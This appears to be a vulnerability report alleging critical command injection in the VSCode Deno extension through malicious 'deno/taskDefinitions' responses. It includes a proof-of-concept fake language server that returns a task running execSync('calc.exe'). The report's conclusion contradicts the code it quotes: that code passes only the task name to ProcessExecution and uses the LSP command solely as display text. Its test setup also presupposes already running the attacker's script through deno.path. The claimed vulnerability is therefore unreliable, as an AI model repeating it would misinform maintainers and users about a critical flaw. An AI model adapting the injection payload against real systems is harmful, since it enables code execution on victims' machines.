### Vulnerability List

* Vulnerability Name: Command Injection via Malicious Task Definition
* Description:
    1. A threat actor crafts a malicious repository containing a compromised Deno Language Server or manipulates the existing LSP response.
    2. The victim opens this malicious repository in VSCode with the Deno extension enabled.
    3. The Deno extension, upon activation or refresh, requests task definitions from the Deno Language Server using the `deno/taskDefinitions` request.
    4. The compromised Language Server responds with a crafted task definition. This definition includes a malicious command and arguments designed for command injection. For example, the command could be `node` and arguments could be `['-e', 'require("child_process").execSync("malicious_command")']`.
    5. The VSCode Deno extension processes this response and displays the malicious task in the Deno Tasks sidebar.
    6. Unsuspecting victim, intending to use project tasks or unaware of the malicious nature of the task, clicks "Run Task" for the maliciously defined task in the sidebar.
    7. The VSCode Deno extension executes the task using `vscode.tasks.executeTask()`, which in turn executes the injected malicious command on the victim's machine.
* Impact: Remote Code Execution (RCE). Successful exploitation allows the attacker to execute arbitrary commands on the victim's machine with the privileges of the VSCode process. This can lead to complete system compromise, data exfiltration, malware installation, and other malicious activities.
* Vulnerability Rank: Critical
* Currently Implemented Mitigations:
    * None. The current implementation does not perform any validation or sanitization of task definitions received from the Deno Language Server. It blindly trusts and executes the commands provided in the task definitions.
* Missing Mitigations:
    * Input Validation and Sanitization: Implement strict validation and sanitization of the `command` and `args` properties in task definitions received from the Language Server. Sanitize or reject task definitions containing potentially dangerous characters or command structures. Use a safe command execution mechanism that prevents injection.
    * User Confirmation: Introduce a confirmation step before executing tasks, especially those fetched from workspace configurations. Display a clear and understandable prompt to the user showing the exact command that is about to be executed and ask for explicit user consent.
    * Principle of Least Privilege: Explore the possibility of executing tasks with reduced privileges. While challenging in the context of VSCode extensions, sandboxing or privilege separation could limit the impact of successful command injection.
* Preconditions:
    * Victim must open a workspace containing a malicious repository or a repository configured to interact with a compromised Deno Language Server.
    * Deno extension must be enabled and active within the workspace.
    * The malicious Deno Language Server must be capable of intercepting or responding to the `deno/taskDefinitions` request with malicious task definitions.
    * Victim must interact with the Deno Tasks sidebar and attempt to execute the maliciously defined task.
* Source Code Analysis:
    1. `client\src\tasks_sidebar.ts`: The `DenoTasksTreeDataProvider` class is responsible for displaying tasks in the sidebar. The `getChildren` method of this class, when called without an element, triggers the task retrieval process.
    ```typescript
    async getChildren(element?: TreeItem): Promise<TreeItem[]> {
        if (!this.#taskTree) {
          const taskItems = await this.taskProvider.provideTasks(); // Calls DenoTaskProvider.provideTasks()
          if (taskItems) {
            this.#taskTree = this.#buildTaskTree(taskItems); // Processes task items
            if (this.#taskTree.length === 0) {
              this.#taskTree = [new NoScripts("No scripts found.")];
            }
          }
        }
        // ...
    }
    ```
    2. `client\src\tasks_sidebar.ts`: The `DenoTaskProvider` class fetches task definitions from the Language Server in its `provideTasks` method.
    ```typescript
    async provideTasks(): Promise<Task[]> {
        const client = this.#extensionContext.client;
        const supportsConfigTasks = this.#extensionContext.serverCapabilities
          ?.experimental?.denoConfigTasks;
        if (!client || !supportsConfigTasks) {
          return [];
        }
        const tasks = [];
        try {
          const configTasks = await client.sendRequest(taskReq); // Sends "deno/taskDefinitions" request
          for (const configTask of configTasks ?? []) {
            // ... processing configTask ...
            const task = buildDenoConfigTask( // Creates vscode.Task from configTask
              workspaceFolder,
              process,
              configTask.name,
              configTask.command ?? configTask.detail,
              Uri.parse(configTask.sourceUri),
            );
            tasks.push(task);
          }
        } catch (err) {
            // ... error handling ...
        }
        return tasks;
    }
    ```
    3. `client\src\tasks.ts`: The `buildDenoConfigTask` function constructs a `vscode.Task` object. Critically, it uses `vscode.ProcessExecution` and populates the `command` and `args` directly from the `configTask` received from the Language Server.
    ```typescript
    export function buildDenoConfigTask(
      scope: vscode.WorkspaceFolder,
      process: string,
      name: string,
      command: string | undefined, // Task command from LSP response
      sourceUri?: vscode.Uri,
    ): vscode.Task {
      const args = [];
      // ... building args array ...
      args.push(name);
      const task = new vscode.Task(
        {
          type: TASK_TYPE,
          name: name,
          command: "task",
          args,
          sourceUri,
        },
        scope,
        name,
        TASK_SOURCE,
        new vscode.ProcessExecution(process, ["task", ...args]), // ProcessExecution with command and args
        ["$deno"],
      );
      task.detail = `$ ${command}`; // Detail also from LSP response
      return task;
    }
    ```
    4. `client\src\tasks_sidebar.ts`: When the user executes a task from the sidebar, the `#runTask` method is called, which directly executes the `vscode.Task` object.
    ```typescript
    #runTask(task: DenoTask) {
        tasks.executeTask(task.task); // Executes the vscode.Task object
    }
    ```
    This flow shows that the extension directly uses the task definitions provided by the Language Server to construct and execute commands without proper validation, leading to a command injection vulnerability.

* Security Test Case:
    1. Setup:
        * Install the VSCode Deno extension.
        * Create a new directory to simulate a malicious repository.
        * Inside the repository, create a `deno.json` file (can be empty or contain valid Deno configuration).
        * Create a file, e.g., `malicious_lsp_server.js`, to simulate a malicious Deno Language Server. This script should:
            * Listen for LSP connections (e.g., using `node-jsonrpc`).
            * Intercept the `deno/taskDefinitions` request.
            * Respond with a crafted task definition containing a malicious command. For example:
            ```javascript
            const { createMessageConnection, StreamMessageReader, StreamMessageWriter } = require('vscode-jsonrpc/node');
            const cp = require('child_process');

            const messageConnection = createMessageConnection(process.stdin, process.stdout);
            messageConnection.listen();

            messageConnection.onRequest('deno/taskDefinitions', () => {
                return [{
                    "name": "Malicious Task",
                    "command": "node",
                    "detail": "Malicious Command Execution",
                    "sourceUri": "file:///path/to/deno.json",
                    "args": ["-e", "require('child_process').execSync('calc.exe')"] // Malicious payload
                }];
            });

            messageConnection.onInitialize(() => {
                return { capabilities: { experimental: { denoConfigTasks: true } } };
            });
            messageConnection.onInitialized(() => { });

            messageConnection.console.log = console.log;
            messageConnection.trace = 2; // Trace.Verbose;
            ```
        * In VSCode settings, configure `deno.path` to point to a script that launches `node malicious_lsp_server.js` instead of the actual `deno lsp`. This is to simulate a compromised LSP. For example, if you save the above script as `malicious_lsp_server.js` in your repo root, set `deno.path` to `${workspaceFolder}/malicious_lsp_server.js`. Note: In a real attack scenario, the attacker would need to find a way to trick the user into using a malicious LSP, which is outside the scope of this extension vulnerability analysis, but for testing, this setup is sufficient.

    2. Test Execution:
        * Open the malicious repository in VSCode.
        * Ensure the Deno extension is enabled for the workspace (`deno.enable` in settings or `deno.json` at workspace root).
        * Open the Deno Tasks sidebar (if not already visible, use the command palette and search for "Deno: Focus on Tasks View").
        * You should see "Malicious Task" listed in the sidebar.
        * Click the "Run Task" icon next to "Malicious Task".
        * Observe the execution of the malicious command. In the example payload `calc.exe` should launch, indicating successful command injection and RCE. In non-Windows environments, replace `calc.exe` with a platform-appropriate command like `gnome-calculator` or `open -a Calculator.app` (macOS), or simply `xcalc` if available. For a less intrusive test, you can use `echo pwned` and check the output in the task terminal.

This test case demonstrates that a malicious LSP can inject commands that are then executed by the VSCode Deno extension, confirming the Command Injection vulnerability.
